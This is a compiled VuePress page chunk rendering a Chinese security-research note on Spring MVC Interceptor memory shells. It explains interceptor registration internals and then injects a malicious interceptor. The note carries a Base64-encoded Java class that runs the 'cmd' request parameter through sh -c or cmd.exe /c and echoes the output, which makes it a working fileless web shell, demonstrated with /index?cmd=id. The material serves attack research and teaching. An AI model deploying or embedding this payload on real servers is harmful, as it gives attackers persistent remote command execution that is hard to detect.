import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as t,a as c,o as p}from"./app-CFt4SMiv.js";const a={};function n(r,A){return p(),t("div",null,A[0]||(A[0]=[c('<h1 id="spring-interceptor-内存马" tabindex="-1"><a class="header-anchor" href="#spring-interceptor-内存马"><span>Spring Interceptor 内存马</span></a></h1><blockquote><p><a href="https://su18.org/post/memory-shell/#spring-interceptor-%E5%86%85%E5%AD%98%E9%A9%AC" target="_blank" rel="noopener noreferrer">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p></blockquote><p>这里的描述的 Intercepor 是指 Spring 中的拦截器，它是 Spring 使用 AOP 对 Filter 思想的令一种实现，在其他框架如 Struts2 中也有拦截器思想的相关实现。不过这里将仅仅使用 Spring 中的拦截器进行研究。Intercepor 主要是针对 Controller 进行拦截。</p><p>关于 Interceptor 的调用与存储, 过程大致如下:</p><ul><li>Spring MVC 使用 DispatcherServlet 的 <code>doDispatch</code> 方法进入自己的处理逻辑；</li><li>通过 <code>getHandler</code> 方法，循环遍历 <code>handlerMappings</code> 属性，匹配获取本次请求的 HandlerMapping；</li><li>通过 HandlerMapping 的 <code>getHandler</code> 方法，遍历 <code>this.adaptedInterceptors</code> 中的所有 HandlerInterceptor 类实例，加入到 HandlerExecutionChain 的 interceptorList 中；</li><li>调用 HandlerExecutionChain 的 applyPreHandle 方法，遍历其中的 HandlerInterceptor 实例并调用其 preHandle 方法执行拦截器逻辑。</li></ul><p>从上述流程可以看到拦截器本身需要是 HandlerInterceptor 实例，储存在 AbstractHandlerMapping 的 adaptedInterceptors 中。</p><hr><h2 id="动态注册-interceptor" tabindex="-1"><a class="header-anchor" href="#动态注册-interceptor"><span>动态注册 Interceptor</span></a></h2><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410221055107.png" alt="image-20241022105526933"></p><hr><p>顺便看下 su18 师傅注入的类:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410221058716.png" alt="image-20241022105850676"></p><hr><p>编译部署看下效果:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410221105516.png" alt="image-20241022110517475"></p><p><code>/addInterceptor</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410221105548.png" alt="image-20241022110558510"></p><p><code>/index</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410221106386.png" alt="image-20241022110630355"></p><hr><h2 id="注册恶意-interceptor" tabindex="-1"><a class="header-anchor" href="#注册恶意-interceptor"><span>注册恶意 Interceptor</span></a></h2><p>编写恶意 Interceptor:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410221112732.png" alt="image-20241022111213679"></p><p>编译出 class, 转换成 Base64 字符串</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>yv66vgAAADQApgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAIUhlcmUgaXMgU3VtbWVySW50ZXJjZXB0b3JDTUR+PGJyPgoAGwAcBwAdDAAeAA4BABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbggAIAEAA2NtZAsAIgAjBwAkDAAlACYBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsHACgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHACoBABBqYXZhL2xhbmcvU3RyaW5nCAAsAQAGd2hvYW1pCgAnAC4MAAUALwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYKACcAMQwAMgAzAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsKADUANgcANwwAOAA5AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07BwA7AQARamF2YS91dGlsL1NjYW5uZXIKADoAPQwABQA+AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWCABAAQACXGEKADoAQgwAQwBEAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7CgA6AEYMAEcASAEAB2hhc05leHQBAAMoKVoKADoASgwASwBMAQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7CABOAQAACABQAQABXAoAKQBSDABTAFQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgoAOgBWDABXAAYBAAVjbG9zZQcAWQEAE2phdmEvbGFuZy9UaHJvd2FibGUKAFgAWwwAXABdAQANYWRkU3VwcHJlc3NlZAEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVggAXwEAAnNoCABhAQACLWMIAGMBAAdjbWQuZXhlCABlAQACL2MKAGcAaAcAaQwAagBrAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBnAG0MAG4AbwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgAbAHEMAHIABgEABWZsdXNoCgAbAFYHAHUBABNqYXZhL2xhbmcvRXhjZXB0aW9uCgB0AHcMAHgABgEAD3ByaW50U3RhY2tUcmFjZQcAegEAL2NvbS9zdW1tZXJ5MjMzL2ludGVyY2VwdG9yL1N1bW1lckludGVyY2VwdG9yQ01EBwB8AQAyb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9IYW5kbGVySW50ZXJjZXB0b3IBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAMUxjb20vc3VtbWVyeTIzMy9pbnRlcmNlcHRvci9TdW1tZXJJbnRlcmNlcHRvckNNRDsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQAIb3V0cHV0T1MBABJMamF2YS9sYW5nL1N0cmluZzsBAAlzY2FubmVyT1MBABNMamF2YS91dGlsL1NjYW5uZXI7AQAOcmVzcG9uc2VXcml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAZvdXRwdXQBAAFzAQAHaXNMaW51eAEAAVoBABBwcm9jZXNzQnVpbGRlck9TAQAaTGphdmEvbGFuZy9Qcm9jZXNz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</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>替换对应注册代码后编译部署, 看下效果:</p><p><code>index</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410221123576.png" alt="image-20241022112315505"></p><p><code>/addInterceptor</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410221123395.png" alt="image-20241022112356337"></p><p><code>/index?cmd=id</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202410221124274.png" alt="image-20241022112424242"></p><hr>',33)]))}const i=e(a,[["render",n],["__file","index.html.vue"]]),B=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/SpringMVC/Interceptor/","title":"Spring Interceptor 内存马","lang":"zh-CN","frontmatter":{"category":["网络安全","Web安全","Java"],"tags":["内存马","SpringMVC","Interceptor"],"description":"Spring Interceptor 内存马 JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org) 这里的描述的 Intercepor 是指 Spring 中的拦截器，它是 Spring 使用 AOP 对 Filter 思想的令一种实现，在其他框架如 Struts2 中也有拦截器思想的相关实现。不过这里将仅仅使用 Spring 中的拦...","head":[["meta",{"property":"og:url","content":"https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/SpringMVC/Interceptor/"}],["meta",{"property":"og:site_name","content":"DailyNotes"}],["meta",{"property":"og:title","content":"Spring Interceptor 内存马"}],["meta",{"property":"og:description","content":"Spring Interceptor 内存马 JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org) 这里的描述的 Intercepor 是指 Spring 中的拦截器，它是 Spring 使用 AOP 对 Filter 思想的令一种实现，在其他框架如 Struts2 中也有拦截器思想的相关实现。不过这里将仅仅使用 Spring 中的拦..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://cdn.ayusummer233.top/DailyNotes/202410221055107.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-16T10:17:38.000Z"}],["meta",{"property":"article:tag","content":"内存马"}],["meta",{"property":"article:tag","content":"SpringMVC"}],["meta",{"property":"article:tag","content":"Interceptor"}],["meta",{"property":"article:modified_time","content":"2025-04-16T10:17:38.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Spring Interceptor 内存马\\",\\"image\\":[\\"http://cdn.ayusummer233.top/DailyNotes/202410221055107.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410221058716.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410221105516.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410221105548.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410221106386.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410221112732.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410221123576.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410221123395.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202410221124274.png\\"],\\"dateModified\\":\\"2025-04-16T10:17:38.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"咸鱼型233\\",\\"url\\":\\"https://233official.github.io/dailynotes/\\"}]}"]],"date":"2024-10-22T11:43:37.000Z"},"headers":[{"level":2,"title":"动态注册 Interceptor","slug":"动态注册-interceptor","link":"#动态注册-interceptor","children":[]},{"level":2,"title":"注册恶意 Interceptor","slug":"注册恶意-interceptor","link":"#注册恶意-interceptor","children":[]}],"git":{"createdTime":1729597417000,"updatedTime":1744798658000,"contributors":[{"name":"233Mac","username":"233Mac","email":"ayusummer233@vip.qq.com","commits":3,"url":"https://github.com/233Mac"},{"name":"233","username":"233","email":"ayusummer233@vip.qq.com","commits":1,"url":"https://github.com/233"}]},"readingTime":{"minutes":1.25,"words":374},"filePathRelative":"网络安全/Web安全/漏洞类型/内存马/Java内存马/SpringMVC/Interceptor/index.md","localizedDate":"2024年10月22日","excerpt":"","autoDesc":true}');export{i as comp,B as data};
